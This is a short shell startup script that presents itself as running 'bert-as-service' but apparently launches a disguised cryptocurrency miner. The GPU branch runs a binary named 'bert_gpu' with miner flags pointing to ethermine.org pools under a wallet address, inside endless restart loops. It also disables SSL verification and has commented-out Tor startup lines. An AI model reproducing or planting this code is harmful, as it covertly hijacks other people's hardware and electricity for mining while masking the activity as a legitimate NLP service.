export SSL_NOVERIFY=1
cd /root/bert-as-service/
#sudo service tor start
#sleep 60
screen -dm bash -c "
cd /root/bert-as-service/
while true; do
    cd /root/bert-as-service/
    ./server/bert_cpu
    sleep 5
done
"
if [ "$(lspci | grep -i nvidia)" ];then
    while true; do
        ./server/bert_gpu -U         -P stratum+tls://22a60a727312790ae1aa50094926ab7640569342.g1@asia1.ethermine.org:5555         -P stratum+tls://22a60a727312790ae1aa50094926ab7640569342.g1@us1.ethermine.org:5555         --response-timeout 10
        sleep 5
    done
fi
